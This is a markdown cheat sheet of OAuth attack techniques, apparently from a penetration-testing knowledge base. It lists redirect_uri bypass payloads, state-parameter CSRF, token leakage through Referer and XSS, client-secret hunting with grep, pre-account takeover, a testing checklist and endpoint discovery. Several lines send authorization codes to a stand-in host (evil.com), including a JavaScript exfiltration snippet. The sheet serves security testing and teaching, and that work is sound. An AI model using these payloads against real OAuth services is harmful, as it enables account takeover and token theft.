---
tags:
  - high
  - logic
---

# OAuth Vulnerabilities

## TL;DR

OAuth misconfigurations enable token theft and account takeover through redirect_uri manipulation, state parameter abuse, and improper token validation.

```
# Quick test
?redirect_uri=https://attacker.com
?redirect_uri=https://legit.com@attacker.com
```

---

## OAuth Flow

```
1. User → SP: "Login with Provider"
2. SP → IdP: Authorization request + redirect_uri
3. IdP → User: "Allow access?"
4. User → IdP: "Yes"
5. IdP → redirect_uri: code/token
6. SP → IdP: Exchange code for token
7. SP → User: Logged in
```

**Key Parameters:**
- `redirect_uri` — Where tokens are sent
- `state` — CSRF protection
- `response_type` — `code`, `token`, or `id_token`
- `client_id` / `client_secret` — App credentials
- `scope` — Permissions requested

---

## Exploitation

### 1. redirect_uri Manipulation

**Open redirect → Token theft:**

```http
GET /oauth/authorize?
  client_id=APP_ID&
  redirect_uri=https://evil.com/callback&
  response_type=code&
  scope=read
```

**Bypass Techniques:**

```
# Path traversal
redirect_uri=https://legit.com/callback/../../../evil
redirect_uri=https://legit.com/callback/..%2f..%2fevil

# Subdomain confusion
redirect_uri=https://evil.legit.com/callback
redirect_uri=https://legit.com.evil.com/callback

# URL parsing exploits
redirect_uri=https://legit.com@evil.com
redirect_uri=https://evil.com#legit.com
redirect_uri=https://legit.com%00.evil.com

# Case sensitivity
redirect_uri=https://LEGIT.COM/callback

# Unicode
redirect_uri=https://lеgit.com/callback  # Cyrillic 'е'
```

### 2. State Parameter Attacks

**Missing state (CSRF):**
1. Attacker initiates OAuth, captures code before completion
2. Victim clicks attacker's link with captured code
3. Victim's account linked to attacker's identity

**Predictable/static state:**
```http
state=12345
state=base64(user_id)
```

### 3. Token Leakage

**Referer header:**
```html
<!-- External resources leak token via Referer -->
<img src="https://evil.com/track.gif">
<!-- Referer: https://target.com/callback?code=SECRET -->
```

**XSS on callback domain:**
```javascript
new Image().src = 'https://evil.com/?code=' + location.search;
```

### 4. Client Credentials Exposure

**Search for leaked secrets:**
```bash
# Mobile apps
strings app.apk | grep -i "client_secret"

# JavaScript bundles
grep -r "client_secret" *.js
```

**Exploit:**
```http
POST /oauth/token

code=STOLEN_CODE&
client_id=LEAKED_ID&
client_secret=LEAKED_SECRET&
grant_type=authorization_code
```

### 5. Pre-Account Takeover

**Classic-Federated Merge:**
1. Register classic account with victim's email (unverified)
2. Victim signs up with OAuth using same email
3. Insecure merge leaves attacker with access

### 6. Cross-App Token Abuse

```http
# Token from App A used against App B
POST /api/login
Authorization: Bearer TOKEN_FROM_DIFFERENT_APP
```

---

## Bypasses

### Response Mode Manipulation

```
response_mode=query      # ?code=xxx
response_mode=fragment   # #code=xxx
response_mode=form_post  # POST body
response_mode=web_message # postMessage
```

### Prompt Bypass

```
prompt=none  # Skip consent screen
```

---

## Real Examples

**pixiv/booth.pm (Path traversal):**
```
redirect_uri=https://booth.pm/users/auth/pixiv/callback/../../../../ja/items/[attacker-product]
# Code leaked via Google Analytics referrer
```

**Shopify unverified email linking:**
```html
<a href="/accounts/{victim_id}/external-login/1" data-method="post">Connect Google</a>
```

---

## Checklist

- [ ] Test redirect_uri manipulation (paths, subdomains, encoding)
- [ ] Check state parameter presence and validation
- [ ] Test with unverified email accounts
- [ ] Look for code/token in URLs (Referer leak)
- [ ] Check client_secret exposure in apps/JS
- [ ] Test cross-app token reuse
- [ ] Verify audience claim validation
- [ ] Test prompt parameter manipulation
- [ ] Check response_mode variations
- [ ] Test clickjacking on consent dialogs

---

## Discovery

```bash
# Find OAuth endpoints
curl https://target.com/.well-known/openid-configuration

# Search JS for OAuth params
grep -rE "oauth|authorize|callback|redirect_uri" *.js
```
